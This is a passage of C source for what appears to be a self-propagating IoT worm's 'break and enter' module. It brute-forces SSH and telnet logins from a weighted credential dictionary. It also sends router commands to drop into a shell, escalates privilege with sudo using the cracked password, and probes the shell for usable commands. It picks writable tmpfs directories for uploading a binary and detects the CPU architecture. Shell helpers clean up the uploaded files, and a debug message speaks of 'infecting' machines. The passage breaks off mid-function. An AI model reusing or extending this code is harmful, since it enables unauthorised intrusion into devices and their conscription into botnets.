/*
* Copyright (c) 2019-2022 David Timber <dxdt@dev.snart.me>
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/
#include "bne.h"
#include "util_ct.h"
#include "util_rt.h"
#include "iset.h"
#include "llist.h"
#include "rnd.h"
#include "libssh2.h"
#include "iobuf.h"
#include "endian.h"
#include "mbedtls.h"
#include "config.h"

#include <string.h>
#include <ctype.h>
#include <errno.h>

#include <elf.h>
#include <unistd.h>
#include <fcntl.h>

#include <mbedtls/base64.h>


static const struct timespec BNE_CONN_OP_TIMEOUT = { 15, 0 }; // 15s
static const struct timespec BNE_SCK_OP_TIMEOUT = { 30, 0 }; // 30s
static const struct timespec BNE_CLOSE_OP_TIMEOUT = { 1, 0 }; // 1s
static const struct timespec BNE_ERR_PAUSE = { 0, 500000000 }; // 500ms
static const struct timespec BNE_PROMPT_PAUSE = { 4, 0 }; // 4s
static const uint32_t BNE_M2M_UPBIN_INT = 43200; // 12 hours

static const size_t BNE_STDIO_IB_SIZE[] = {
#if !PRNE_USE_MIN_MEM
	PRNE_HTBT_STDIO_LEN_MAX,
#endif
	512,
	0
};

#define BNE_CONN_ATTEMPT 3

#define BNE_HDELAY_TYPE_MIN		150		// 150ms
#define BNE_HDELAY_TYPE_VAR		100		// 100ms
#define BNE_HDELAY_PROMPT_MIN	800		// 0.8s
#define BNE_HDELAY_PROMPT_VAR	1000	// 1s

#define BNE_AVAIL_CMD_ECHO		0x01
#define BNE_AVAIL_CMD_CAT		0x02
#define BNE_AVAIL_CMD_DD		0x04
#define BNE_AVAIL_CMD_BASE64	0x08
#define BNE_AVAIL_CMD_SLEEP		0x10


struct prne_bne {
	prne_iset_t cred_set;
	prne_rnd_t rnd;
	prne_bne_result_t result;
	prne_bne_param_t param;
};

typedef struct {
	unsigned int attempt;
	uint16_t port;
} bne_port_t;

typedef struct {
	LIBSSH2_SESSION *ss;
	LIBSSH2_CHANNEL *ch_shell;
	char *auth_list;
	int fd;
	unsigned int login_cnt;
	prne_llist_t ports;
} bne_vssh_ctx_t;

typedef struct {
	char *prompt_line;
	size_t prompt_line_len;
	uint8_t *m_lefto;
	uint8_t *ptr_lefto;
	size_t lefto_len;
	int fd;
	unsigned int login_cnt;
	prne_llist_t ports;
} bne_vtn_ctx_t;

typedef unsigned int bne_avail_cmds_t;

typedef struct {
	void *ctx;
	ssize_t (*read_f) ( // combines stdout and stderr
		void *ctx,
		void *buf,
		const size_t len,
		pth_event_t ev);
	ssize_t (*write_f) ( // loops on the buf to always return len or -1
		void *ctx,
		const void *buf,
		const size_t len,
		pth_event_t ev);
	bool (*flush_f) (void *ctx);
	/* Newline sequence to send
	* "\r\n" for telnet. "\n" for anything else.
	*
	* We should send "\r\0", not "\r\n" as specified in the protocol, but it's
	* tricky to implement. Most server implementations will understand any
	* newline sequence anyways since Windows telnet client sends CrLf.
	*
	* Length must be be <= 2!
	*/
	const char *nl;
	char *host_cred;
	char *org_id;
	uint8_t buf[2048];
	char *upload_dir;
	char *lockfile;
	bool has_lock;
	pth_event_t ev;
	prne_iobuf_t ib;
	prne_llist_t up_loc; // series of null-terminated string
	prne_llist_t up_methods; // series of pointer to upload functions
	prne_bin_rcb_ctx_t rcb;
	bne_avail_cmds_t avail_cmds;
	char stx_out[53];
	char stx_str[37];
	char eot_out[53];
	char eot_str[37];
} bne_sh_ctx_t;

static void bne_sh_ctx_free_mp (bne_sh_ctx_t *p) {
	for (prne_llist_entry_t *e = p->up_loc.head; e != NULL; e = e->next) {
		prne_free((void*)e->element);
	}
	prne_llist_clear(&p->up_loc);
}

static void bne_init_sh_ctx (bne_sh_ctx_t *p, prne_rnd_t *rnd) {
	uint8_t uuid[16];

	prne_memzero(p, sizeof(bne_sh_ctx_t));
	prne_init_llist(&p->up_loc);
	prne_init_llist(&p->up_methods);
	prne_init_iobuf(&p->ib);
	prne_iobuf_setextbuf(&p->ib, p->buf, sizeof(p->buf), 0);
	prne_init_bin_rcb_ctx(&p->rcb);

	if (!prne_rnd(rnd, uuid, 16)) {
		memset(uuid, 0xAA, 16);
	}
	prne_uuid_tostr(uuid, p->stx_str);
	sprintf(
		p->stx_out,
		"%02x%02x%02x%02x\\\\x2D%02x%02x\\\\x2D%02x%02x\\\\x2D%02x%02x"
		"\\\\x2D%02x%02x%02x%02x%02x%02x",
		uuid[0],
		uuid[1],
		uuid[2],
		uuid[3],
		uuid[4],
		uuid[5],
		uuid[6],
		uuid[7],
		uuid[8],
		uuid[9],
		uuid[10],
		uuid[11],
		uuid[12],
		uuid[13],
		uuid[14],
		uuid[15]);

	if (!prne_rnd(rnd, uuid, 16)) {
		memset(uuid, 0xBB, 16);
	}
	prne_uuid_tostr(uuid, p->eot_str);
	sprintf(
		p->eot_out,
		"%02x%02x%02x%02x\\\\x2D%02x%02x\\\\x2D%02x%02x\\\\x2D%02x%02x"
		"\\\\x2D%02x%02x%02x%02x%02x%02x",
		uuid[0],
		uuid[1],
		uuid[2],
		uuid[3],
		uuid[4],
		uuid[5],
		uuid[6],
		uuid[7],
		uuid[8],
		uuid[9],
		uuid[10],
		uuid[11],
		uuid[12],
		uuid[13],
		uuid[14],
		uuid[15]);
}

static void bne_free_sh_ctx (bne_sh_ctx_t *p) {
	prne_free(p->host_cred);
	prne_free(p->org_id);
	bne_sh_ctx_free_mp(p);
	prne_free_llist(&p->up_loc);
	prne_free_llist(&p->up_methods);
	prne_free(p->upload_dir);
	prne_free(p->lockfile);
	pth_event_free(p->ev, FALSE);
	prne_free_bin_rcb_ctx(&p->rcb);

	prne_memzero(p, sizeof(bne_sh_ctx_t));
}

static bool bne_build_cred_set (prne_bne_t *ctx) {
	bool ret = true;

	prne_iset_clear(&ctx->cred_set);
	if (ctx->param.cred_dict == NULL) {
		return true;
	}

	for (size_t i = 0; ret && i < ctx->param.cred_dict->cnt; i += 1) {
		ret = prne_iset_insert(
			&ctx->cred_set,
			(prne_iset_val_t)(ctx->param.cred_dict->arr + i));
	}

	return ret;
}

static void bne_delete_cred_w_id (prne_bne_t *ctx, const char *id) {
	prne_cred_dict_entry_t *ent;
	const char *ent_id;

	if (ctx->param.cb.enter_dd != NULL &&
		!ctx->param.cb.enter_dd(ctx->param.cb_ctx))
	{
		return;
	}

	for (size_t i = 0; i < ctx->cred_set.size;) {
		ent = (prne_cred_dict_entry_t*)ctx->cred_set.arr[i];
		ent_id = ctx->param.cred_dict->m + ent->id;

		if (strcmp(id, ent_id) == 0) {
			prne_iset_erase(&ctx->cred_set, (prne_iset_val_t)ent);
		}
		else {
			i += 1;
		}
	}

	if (ctx->param.cb.exit_dd != NULL) {
		ctx->param.cb.exit_dd(ctx->param.cb_ctx);
	}
}

static void bne_free_result_cred (prne_bne_t *ctx) {
	prne_sfree_str(ctx->result.cred.id);
	prne_sfree_str(ctx->result.cred.pw);
	ctx->result.cred.id = NULL;
	ctx->result.cred.pw = NULL;
}

/*
* Does linear search to save memory. This is slow. But hey, as long as it works.
*/
static bool bne_pop_cred (
	prne_bne_t *ctx,
	const bool per_id)
{
	prne_cred_dict_entry_t *ent, *rc = NULL;
	size_t coin;
	uint_fast16_t w_tmp;
	uint8_t wv;
	prne_iset_t w_set;
	prne_llist_t cl;
	const char *ent_id, *ent_pw;
	bool ret = true, id_match;

	if (ctx->cred_set.size == 0) {
		return false;
	}
	if (ctx->param.cb.enter_dd != NULL &&
		!ctx->param.cb.enter_dd(ctx->param.cb_ctx))
	{
		ctx->result.err = errno;
		return false;
	}
	/* == CRITICAL SECTION START == */
	// DO NOT yield to other pth threads after this point!

	prne_init_iset(&w_set);
	prne_init_llist(&cl);

	// gather weight values
	for (size_t i = 0; i < ctx->cred_set.size; i += 1) {
		ent = (prne_cred_dict_entry_t*)ctx->cred_set.arr[i];
		if (!prne_iset_insert(&w_set, (prne_iset_val_t)(ent->weight))) {
			ctx->result.err = errno;
			ret = false;
			goto END;
		}
	}

	do {
		w_tmp = 0;
		for (size_t i = 0; i < w_set.size; i += 1) {
			w_tmp += (uint_fast16_t)w_set.arr[i];
		}

		// determine weight
		if (!prne_rnd(&ctx->rnd, (uint8_t*)&coin, sizeof(size_t))) {
			ctx->result.err = errno;
			ret = false;
			goto END;
		}

		if (w_tmp > 0) {
			coin = coin % w_tmp;

			w_tmp = 0;
			wv = (uint8_t)(w_set.arr[w_set.size - 1]);
			for (size_t i = 0; i < w_set.size; i += 1) {
				w_tmp += (uint_fast16_t)w_set.arr[i];
				if (coin < w_tmp) {
					wv = (uint8_t)(w_set.arr[i]);
					break;
				}
			}
		}
		else {
			wv = 0;
		}

		// search
		prne_llist_clear(&cl);
		for (size_t i = 0; i < ctx->cred_set.size; i += 1) {
			ent = (prne_cred_dict_entry_t*)ctx->cred_set.arr[i];
			ent_id = ctx->param.cred_dict->m + ent->id;

			if (per_id && ctx->result.cred.id != NULL) {
				id_match = strcmp(ctx->result.cred.id, ent_id) == 0;
			}
			else {
				id_match = true;
			}

			if (id_match && ent->weight == wv) {
				if (!prne_llist_append(&cl, (prne_llist_element_t)ent)) {
					ret = false;
					ctx->result.err = errno;
					goto END;
				}
			}
		}

		if (cl.size > 0) {
			prne_llist_entry_t *le;

			if (!prne_rnd(&ctx->rnd, (uint8_t*)&coin, sizeof(size_t))) {
				ctx->result.err = errno;
				ret = false;
				goto END;
			}
			coin = coin % cl.size;

			le = cl.head;
			for (size_t i = 0; i < coin; i += 1) {
				le = le->next;
			}

			rc = (prne_cred_dict_entry_t*)le->element;
			goto END;
		}
		else {
			// try next weight value
			prne_iset_erase(&w_set, (prne_iset_val_t)(wv));
		}
	} while (w_set.size > 0);

END:
	prne_free_iset(&w_set);
	prne_free_llist(&cl);
	bne_free_result_cred(ctx);
	if (rc != NULL && ret) {
		size_t id_len, pw_len;

		prne_iset_erase(&ctx->cred_set, (prne_iset_val_t)rc);

		ent_id = ctx->param.cred_dict->m + rc->id;
		ent_pw = ctx->param.cred_dict->m + rc->pw;
		id_len = strlen(ent_id);
		pw_len = strlen(ent_pw);

		ctx->result.cred.id = prne_alloc_str(id_len);
		ctx->result.cred.pw = prne_alloc_str(pw_len);
		if (ctx->result.cred.id == NULL || ctx->result.cred.pw == NULL) {
			ctx->result.err = errno;
			ret = false;
			bne_free_result_cred(ctx);
		}
		else {
			memcpy(ctx->result.cred.id, ent_id, id_len + 1);
			memcpy(ctx->result.cred.pw, ent_pw, pw_len + 1);
		}
	}

	if (ctx->param.cb.exit_dd != NULL) {
		ctx->param.cb.exit_dd(ctx->param.cb_ctx);
	}

	return ret;
}

static bool bne_do_connect (
	int *fd,
	const prne_net_endpoint_t *ep,
	pth_event_t ev)
{
	uint8_t m_sa[prne_op_max(
		sizeof(struct sockaddr_in),
		sizeof(struct sockaddr_in6))];
	struct sockaddr_in *sa4;
	struct sockaddr_in6 *sa6;
	socklen_t sl;
	int f_ret;
	struct pollfd pfd;

	switch (ep->addr.ver) {
	case PRNE_IPV_4:
		sl = sizeof(struct sockaddr_in);
		sa4 = (struct sockaddr_in*)m_sa;
		prne_memzero(m_sa, sl);
		prne_net_ep_tosin4(ep, sa4);
		*fd = socket(sa4->sin_family, SOCK_STREAM, 0);
		break;
	case PRNE_IPV_6:
		sl = sizeof(struct sockaddr_in6);
		sa6 = (struct sockaddr_in6*)m_sa;
		prne_memzero(m_sa, sl);
		prne_net_ep_tosin6(ep, sa6);
		*fd = socket(sa6->sin6_family, SOCK_STREAM, 0);
		break;
	default:
		errno = EINVAL;
		return false;
	}

	if (*fd < 0) {
		return false;
	}
	if (!prne_sck_fcntl(*fd)) {
		return false;
	}

	f_ret = connect(*fd, (struct sockaddr*)m_sa, sl);
	if (f_ret < 0 && errno != EINPROGRESS) {
		goto ERR;
	}

	pfd.fd = *fd;
	pfd.events = POLLOUT;
	f_ret = prne_pth_poll(&pfd, 1, -1, ev);
	if (f_ret > 0) {
		socklen_t sl = sizeof(int);
		int sov = 0;

		if (!(pfd.revents & ~POLLOUT) &&
			getsockopt(*fd, SOL_SOCKET, SO_ERROR, &sov, &sl) == 0)
		{
			if (sov == 0) {
				return true;
			}
			errno = sov;
		}
	}
	else {
		// Interrupted by signal? too bad.
	}

ERR:
	prne_close(*fd);
	*fd = -1;
	return true;
}

/*******************************************************************************
                           Shell Op Abstraction Layer
*******************************************************************************/
typedef bool (*bne_sh_upload_ft)(prne_bne_t *, bne_sh_ctx_t *, const char *);

typedef struct {
	char *path;
	size_t weight;
} bne_mp_t;

static int bne_mp_cmp_f (const void *a, const void *b) {
	const size_t w_a = ((const bne_mp_t*)a)->weight;
	const size_t w_b = ((const bne_mp_t*)b)->weight;

	return
		(w_a < w_b) ? -1 :
		(w_a > w_b) ? 1 :
		0;
}

typedef struct {
	void *ctx;
	void (*line_f)(void *ctx, char *line);
	size_t (*bin_f)(void *ctx, uint8_t *m, size_t len);
} bne_sh_parser_t;

typedef struct {
	unsigned long records_in[2];
	unsigned long records_out[2];
	unsigned long bytes;
} bne_sh_dd_parse_ctx_t;

static void bne_sh_int_parse_f (void *ctx, char *line) {
	int *v = (int*)ctx;
	if (line[0] != 0) { // ignore empty line
		sscanf(line, "%d", v);
	}
}

#if 0
static void bne_sh_dd_parse_f (void *ctx_p, char *line) {
	bne_sh_dd_parse_ctx_t *ctx = (bne_sh_dd_parse_ctx_t*)ctx_p;

	if (line[0] == 0) {
		return;
	}

	if (strstr(line, "records in") != NULL) {
		sscanf(line, "%lu+%lu", ctx->records_in + 0, ctx->records_in + 1);
	}
	else if (strstr(line, "records out") != NULL) {
		sscanf(line, "%lu+%lu", ctx->records_out + 0, ctx->records_out + 1);
	}
	else if (strstr(line, "bytes") != NULL) {
		sscanf(line, "%lu", &ctx->bytes);
	}
}
#endif

static void bne_init_sh_parser (bne_sh_parser_t *p) {
	prne_memzero(p, sizeof(bne_sh_parser_t));
}

static void bne_free_sh_parser (bne_sh_parser_t *p) {}

static bool bne_sh_send (
	bne_sh_ctx_t *s_ctx,
	const char *cmdline)
{
	const size_t len = strlen(cmdline);
	ssize_t f_ret;

	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 3) {
		prne_dbgpf(
			"bne sh@%"PRIxPTR"\t: bne_sh_send():\n%s\n",
			(uintptr_t)s_ctx->ctx,
			cmdline);
	}

	prne_pth_reset_timer(&s_ctx->ev, &BNE_SCK_OP_TIMEOUT);
	f_ret = s_ctx->write_f(s_ctx->ctx, cmdline, len, s_ctx->ev);
	if (f_ret <= 0 || (size_t)f_ret != len) {
		return false;
	}
	return true;
}

static char *bne_sh_mknexted_cmd (bne_sh_ctx_t *s_ctx, const char *cmd) {
	const char *sb[] = {
		"echo -ne ", s_ctx->stx_out, ";\\", s_ctx->nl,
		cmd, // terminator supplied by caller
		"\\", s_ctx->nl,
		"echo -ne ", s_ctx->eot_out, s_ctx->nl
	};

	return prne_build_str(sb, sizeof(sb)/sizeof(const char*));
}

static bool bne_sh_sync_stx (bne_sh_ctx_t *s_ctx) {
	ssize_t f_ret;
	char *delim;

	while (true) {
		delim = (char*)prne_memmem(
			s_ctx->ib.m,
			s_ctx->ib.len,
			s_ctx->stx_str,
			sizeof(s_ctx->stx_str) - 1);
		if (delim == NULL) {
			prne_iobuf_shift(
				&s_ctx->ib,
				-(s_ctx->ib.len /
					(sizeof(s_ctx->stx_str) - 1) *
					(sizeof(s_ctx->stx_str) - 1)));
		}
		else {
			prne_iobuf_shift(
				&s_ctx->ib,
				-(delim - (char*)s_ctx->ib.m + (sizeof(s_ctx->stx_str) - 1)));
			break;
		}

		prne_pth_reset_timer(&s_ctx->ev, &BNE_SCK_OP_TIMEOUT);
		f_ret = s_ctx->read_f(
			s_ctx->ctx,
			s_ctx->ib.m + s_ctx->ib.len,
			s_ctx->ib.avail,
			s_ctx->ev);
		if (f_ret <= 0) {
			return false;
		}
		prne_iobuf_shift(&s_ctx->ib, f_ret);
	}

	return true;
}

static bool bne_sh_runcmd_line (
	bne_sh_ctx_t *s_ctx,
	bne_sh_parser_t *p_ctx,
	const char *cmd)
{
	bool ret = false;
	char *nested = bne_sh_mknexted_cmd(s_ctx, cmd);
	char *delim[3], *endl;
	ssize_t f_ret;

	if (nested == NULL || !bne_sh_send(s_ctx, nested)) {
		goto END;
	}

	if (!bne_sh_sync_stx(s_ctx)) {
		goto END;
	}

	// do parse
	while (true) {
		delim[0] = (char*)memchr(s_ctx->ib.m, '\r', s_ctx->ib.len);
		delim[1] = (char*)memchr(s_ctx->ib.m, '\n', s_ctx->ib.len);
		delim[2] = (char*)memchr(s_ctx->ib.m, '\0', s_ctx->ib.len);
		if (delim[0] != NULL || delim[1] != NULL) {
			if (delim[0] + 1 == delim[1]) {
				// CrLf
				*delim[0] = 0;
				*delim[1] = 0;
				endl = delim[1];
			}
			else if (delim[0] + 1 == delim[2]) {
				// CrNul
				*delim[0] = 0;
				// *delim[2] = 0; // haha
				endl = delim[2];
			}
			else {
				// just cr and/or lf
				if (delim[0] != NULL && delim[1] != NULL) {
					// both found. truncate to the first one
					endl = prne_op_min(delim[0], delim[1]);
				}
				else {
					// whichever found
					endl = prne_op_max(delim[0], delim[1]);
				}
				*endl = 0;
			}

			if (p_ctx->line_f != NULL) {
				p_ctx->line_f(p_ctx->ctx, (char*)s_ctx->ib.m);
			}

			prne_iobuf_shift(
				&s_ctx->ib,
				-(endl - (char*)s_ctx->ib.m + 1));
			continue;
		}
		else {
			delim[0] = (char*)prne_memmem(
				s_ctx->ib.m,
				s_ctx->ib.len,
				s_ctx->eot_str,
				sizeof(s_ctx->eot_str) - 1);
			if (delim[0] != NULL) {
				prne_iobuf_reset(&s_ctx->ib);
				ret = true;
				break;
			}
		}

		prne_pth_reset_timer(&s_ctx->ev, &BNE_SCK_OP_TIMEOUT);
		f_ret = s_ctx->read_f(
			s_ctx->ctx,
			s_ctx->ib.m + s_ctx->ib.len,
			s_ctx->ib.avail,
			s_ctx->ev);
		if (f_ret <= 0) {
			goto END;
		}
		prne_iobuf_shift(&s_ctx->ib, f_ret);
	}

END:
	prne_free(nested);
	return ret;
}

static bool bne_sh_runcmd_bin (
	bne_sh_ctx_t *s_ctx,
	bne_sh_parser_t *p_ctx,
	const char *cmd)
{
	bool ret = false;
	char *nested = bne_sh_mknexted_cmd(s_ctx, cmd);
	char *delim;
	ssize_t f_ret;
	size_t consume;

	if (nested == NULL || !bne_sh_send(s_ctx, nested)) {
		goto END;
	}

	if (!bne_sh_sync_stx(s_ctx)) {
		goto END;
	}

	// do parse
	while (true) {
		if (p_ctx->bin_f != NULL && s_ctx->ib.len > 0) {
			consume = p_ctx->bin_f(p_ctx->ctx, s_ctx->ib.m, s_ctx->ib.len);
		}
		else {
			consume = s_ctx->ib.len;
		}

		delim = (char*)prne_memmem(
			s_ctx->ib.m,
			s_ctx->ib.len,
			s_ctx->eot_str,
			sizeof(s_ctx->eot_str) - 1);
		if (delim != NULL) {
			prne_iobuf_reset(&s_ctx->ib);
			ret = true;
			break;
		}
		else {
			prne_iobuf_shift(&s_ctx->ib, -consume);
		}

		prne_pth_reset_timer(&s_ctx->ev, &BNE_SCK_OP_TIMEOUT);
		f_ret = s_ctx->read_f(
			s_ctx->ctx,
			s_ctx->ib.m + s_ctx->ib.len,
			s_ctx->ib.avail,
			s_ctx->ev);
		if (f_ret <= 0) {
			goto END;
		}
		prne_iobuf_shift(&s_ctx->ib, f_ret);
	}

END:
	prne_free(nested);
	return ret;
}

static bool bne_sh_runcmd (bne_sh_ctx_t *s_ctx, const char *cmd) {
	bne_sh_parser_t parser;
	bool ret;

	bne_init_sh_parser(&parser);
	ret = bne_sh_runcmd_line(s_ctx, &parser, cmd);
	bne_free_sh_parser(&parser);
	return ret;
}

static bool bne_sh_sync (bne_sh_ctx_t *s_ctx) {
	return bne_sh_runcmd(s_ctx, NULL);
}

static int bne_sh_get_uid (bne_sh_ctx_t *s_ctx) {
	bne_sh_parser_t parser;
	int uid = 0;

	bne_init_sh_parser(&parser);
	parser.ctx = &uid;
	parser.line_f = bne_sh_int_parse_f;

	if (!bne_sh_runcmd_line(s_ctx, &parser, "id -u;")) {
		uid = -1;
	}

	bne_free_sh_parser(&parser);
	return uid;
}

static bool bne_sh_sudo (prne_bne_t *ctx, bne_sh_ctx_t *s_ctx) {
	const char *sb[] = {
		"sudo -S su; echo -n ", s_ctx->eot_out, s_ctx->nl
	};
	bool ret = false;
	ssize_t f_ret;
	char *cmd = NULL, *delim;

	cmd = prne_build_str(sb, sizeof(sb)/sizeof(const char*));
	if (cmd == NULL) {
		goto END;
	}
	if (!bne_sh_send(s_ctx, cmd)) {
		goto END;
	}

	while (true) {
		prne_pth_reset_timer(&s_ctx->ev, &BNE_PROMPT_PAUSE);
		f_ret = s_ctx->read_f(
			s_ctx->ctx,
			s_ctx->ib.m + s_ctx->ib.len,
			s_ctx->ib.avail,
			s_ctx->ev);
		if (f_ret <= 0) {
			break;
		}
		prne_iobuf_shift(&s_ctx->ib, f_ret);
	}

	// timeout is a normal outcome!
	if (pth_event_status(s_ctx->ev) != PTH_STATUS_OCCURRED) {
		// read op has not timedout
		ctx->result.err = errno;
		goto END;
	}
	delim = (char*)prne_memmem(
		s_ctx->ib.m,
		s_ctx->ib.len,
		s_ctx->eot_str,
		sizeof(s_ctx->eot_str) - 1);
	if (delim != NULL) {
		// UID is not 0, but sudo command is not available
		prne_iobuf_reset(&s_ctx->ib);
		ctx->result.err = EPERM;
		goto END;
	}

	if (!(bne_sh_send(s_ctx, ctx->result.cred.pw) &&
		bne_sh_send(s_ctx, s_ctx->nl)))
	{
		ctx->result.err = errno;
		goto END;
	}

	// check the uid again
	ret = bne_sh_sync(s_ctx) && bne_sh_get_uid(s_ctx) == 0;

END:
	prne_free(cmd);
	return ret;
}

static void bne_sh_availcmd_parse_f (void *ctx, char *line) {
	bne_sh_ctx_t *s_ctx = (bne_sh_ctx_t*)ctx;
	int ec;

	if (sscanf(line, "echo: %d", &ec) == 1 && ec < 127) {
		s_ctx->avail_cmds |= BNE_AVAIL_CMD_ECHO;
	}
	else if (sscanf(line, "cat: %d", &ec) == 1 && ec < 127) {
		s_ctx->avail_cmds |= BNE_AVAIL_CMD_CAT;
	}
	else if (sscanf(line, "dd: %d", &ec) == 1 && ec < 127) {
		s_ctx->avail_cmds |= BNE_AVAIL_CMD_DD;
	}
	else if (sscanf(line, "base64: %d", &ec) == 1 && ec < 127) {
		s_ctx->avail_cmds |= BNE_AVAIL_CMD_BASE64;
	}
	else if (sscanf(line, "sleep: %d", &ec) == 1 && ec < 127) {
		s_ctx->avail_cmds |= BNE_AVAIL_CMD_SLEEP;
	}
}

typedef struct {
	bne_sh_ctx_t *s_ctx;
	int err;
} bne_mp_parse_ctx_t;

static void bne_sh_mounts_parse_f (void *ctx_p, char *line) {
	bne_mp_parse_ctx_t *ctx = (bne_mp_parse_ctx_t*)ctx_p;
	char val[256];
	char *mp;
	size_t len;

	// fs
	if (sscanf(line, "%*s %*s %255s %*s %*d %*d", val) != 1) {
		return;
	}
	if (!(strcmp(val, "devtmpfs") == 0 || strcmp(val, "tmpfs") == 0)) {
		return;
	}
	// options
	if (sscanf(line, "%*s %*s %*s %255s %*d %*d", val) != 1) {
		return;
	}
	if (strstr(val, "rw") != val) {
		return;
	}
	// mount point
	if (sscanf(line, "%*s %255s %*s %*s %*d %*d", val) != 1) {
		return;
	}

	len = strlen(val);
	mp = prne_alloc_str(len);
	if (mp == NULL) {
		ctx->err = errno;
		return;
	}
	memcpy(mp, val, len + 1);
	if (prne_llist_append(
		&ctx->s_ctx->up_loc,
		(prne_llist_element_t)mp) == NULL)
	{
		ctx->err = errno;
		prne_free(mp);
		return;
	}
}

typedef struct {
	int err;
	uint16_t e_machine;
	uint8_t e_data;
} bne_sh_elf_parse_ctx_t;

static size_t bne_sh_elf_parse_f (
	void *ctx_p,
	uint8_t *m,
	size_t len)
{
	bne_sh_elf_parse_ctx_t *ctx = (bne_sh_elf_parse_ctx_t*)ctx_p;

	if (ctx->err != 0) {
		return len;
	}
	if (ctx->e_data == 0) {
		const Elf32_Ehdr *hdr = (const Elf32_Ehdr*)m;

		if (len < sizeof(Elf32_Ehdr)) {
			return 0;
		}

		if (!(m[EI_MAG0] == ELFMAG0 &&
			m[EI_MAG1] == ELFMAG1 &&
			m[EI_MAG2] == ELFMAG2 &&
			m[EI_MAG3] == ELFMAG3) ||
			(m[EI_CLASS] != ELFCLASS32 && m[EI_CLASS] != ELFCLASS64))
		{
			ctx->err = ENOEXEC;
			return len;
		}

		ctx->e_data = m[EI_DATA];
		switch (ctx->e_data) {
		case ELFDATA2LSB: ctx->e_machine = prne_le16toh(hdr->e_machine); break;
		case ELFDATA2MSB: ctx->e_machine = prne_be16toh(hdr->e_machine); break;
		default:
			ctx->err = ENOEXEC;
			return len;
		}
	}

	return len;
}

typedef struct {
	bool v7;
	bool vfp;
	bool thumb;
} bne_sh_cpuinfo_parse_ctx_t;

static void bne_sh_cpuinfo_parse_f (void *ctx_p, char *line) {
	bne_sh_cpuinfo_parse_ctx_t *ctx = (bne_sh_cpuinfo_parse_ctx_t*)ctx_p;

	prne_transcstr(line, prne_ctolower);

	if ((strstr(line, "processor") == line ||
		strstr(line, "model name") == line) &&
		strstr(line, "v7") != NULL)
	{
		ctx->v7 = true;
	}
	else if (strstr(line, "features") == line) {
		if (strstr(line, "vfp") != NULL) {
			ctx->vfp = true;
		}
		if (strstr(line, "thumb") != NULL) {
			ctx->thumb = true;
		}
	}
}

/*
* 1. Escalate shell if $(id -u) -ne 0
*	- Run "sudo su"
*	- Wait for prompt //.*:
*	- Type password
* 2. Check available commands
* 3. Define shell functions
* 4. Find a suitable mount point for upload
*	- read /proc/mounts
*	- filter out ro, non-ephemeral fs
*	- prioritise:
*		/tmp: 4
*		/run: 3
*		/dev/shm: 2
*		/dev: 1
*		(other): 0
* 5. Determine arch
*/
static bool bne_sh_setup (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx)
{
#define AVAILCMD_CMD\
	"echo 2> /dev/null > /dev/null; echo echo: $?;"\
	"echo | cat 2> /dev/null > /dev/null; echo cat: $?;"\
	"echo | dd 2> /dev/null > /dev/null; echo dd: $?;"\
	"echo | base64 2> /dev/null > /dev/null; echo base64: $?;"\
	"echo | sleep 0 2> /dev/null > /dev/null; echo sleep: $?;"
	// "echo | wc 2> /dev/null > /dev/null; echo wc: $?;"
/* The upload guard shell functions
*
* - When the shell dies
*   - Clean up all files and exit if the lock file still exists
*   - Otherwise, just exit
* - Just exit when the process is still running and the upload directory or the
*   lock file is no longer present
*
* Shell
*/
#define UPLOAD_GUARD_F\
	"prne_upload_guard () { "\
		"while [ true ]; do "\
			"sleep 1;"\
			"if ! kill -0 $1; then "\
				"if [ -e \"$3\" ]; then "\
					"rm -rf \"$2\" \"$3\";"\
				"fi;"\
				"break;"\
			"elif [ ! -e \"$2\" ] || [ ! -e \"$3\" ]; then "\
				"break;"\
			"fi;"\
		"done;"\
	" };"\
/* Usage: prne_start_ug <shell pid> <upload dir> <lock file> */\
	"prne_start_ug () { "\
		"prne_upload_guard \"$1\" \"$2\" \"$3\" > /dev/null 2> /dev/null &"\
	" };"
	prne_static_assert(
		sizeof(AVAILCMD_CMD) < 512 && sizeof(UPLOAD_GUARD_F) < 512,
		"This can overflow in old systems");
	bool ret = false;
	char *mp;
	int uid;
	bne_mp_t *mp_arr = NULL;
	size_t mp_cnt = 0;
	prne_llist_entry_t *m_ent;
	bne_sh_parser_t parser;

	bne_sh_ctx_free_mp(s_ctx);
	bne_init_sh_parser(&parser);

// TRY
	{
		// Give me shell!
		const char *sb[] = {
			"enable", s_ctx->nl,
			"system", s_ctx->nl,
			"shell", s_ctx->nl
		};
		char *cmd = prne_build_str(sb, sizeof(sb)/sizeof(const char*));

		if (cmd == NULL) {
			ctx->result.err = errno;
			goto END;
		}
		ret = bne_sh_send(s_ctx, cmd);
		prne_free(cmd);

		if (!ret) {
			ctx->result.err = errno;
			goto END;
		}
	}

	// Skip motd
	if (!s_ctx->flush_f(s_ctx->ctx)) {
		ctx->result.err = errno;
		goto END;
	}
	if (!bne_sh_sync(s_ctx)) {
		ctx->result.err = errno;
		goto END;
	}

	// Check uid
	uid = bne_sh_get_uid(s_ctx);
	if (uid < 0) {
		ctx->result.err = errno;
		goto END;
	}
	if (uid != 0) {
		// Not root. Try escalating the shell
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
			prne_dbgpf(
				"bne sh@%"PRIxPTR"\t: broke in as uid %d. Trying sudo...\n",
				(uintptr_t)ctx,
				uid);
		}

		if (!bne_sh_sudo(ctx, s_ctx)) {
			// sudo failed. no point infecting unprivileged machine
			ctx->result.err = errno;
			if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
				prne_dbgpf(
